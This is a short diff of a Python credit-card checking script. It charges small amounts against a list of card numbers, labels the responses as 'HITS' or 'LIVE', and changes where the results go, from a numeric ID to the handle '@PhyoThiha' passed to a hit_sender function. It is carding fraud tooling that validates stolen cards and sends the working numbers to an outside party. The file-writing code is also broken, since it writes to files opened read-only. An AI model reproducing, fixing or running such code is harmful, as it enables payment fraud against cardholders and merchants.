@@ -54,7 +54,7 @@ with open(file_open,'r') as file:
             if 'succeeded' in r2.text or 'Payment complete' in r2.text or '"cvc_check": "pass"' in r2.text:
                 output = '\n[ + ] # HITS : '+card+'\n[ + ] Result : 0.8$ CCN Charged ✅\n[ + ] Time : '+str(total_time)
                 print(colored(output, 'green'))
-                hit_sender(card, output, '766109755')
+                hit_sender(card, output, '@PhyoThiha')
                 with open('HITS.txt','r') as file:
                     file.write(card+'\n')
                     file.close()
@@ -63,7 +63,7 @@ with open(file_open,'r') as file:
             elif 'insufficient_funds' in r2.text or 'incorrect_cvc' in r2.text or 'invalid_account' in r2.text or 'transaction_not_allowed' in r2.text or 'authentication_required' in r2.text:
                 output = '\n[ + ] # LIVE : '+card+'\n[ + ] Result : '+json.loads(r2.text)['error']['message']+' ✅\n[ + ] Time : '+str(total_time)  
                 print(colored(output, 'green'))
-                hit_sender(card, output, '766109755')
+                hit_sender(card, output, '@PhyoThiha')
                 with open('LIVE.txt','r') as file:
                     file.write(card+'\n')
                     file.close() 
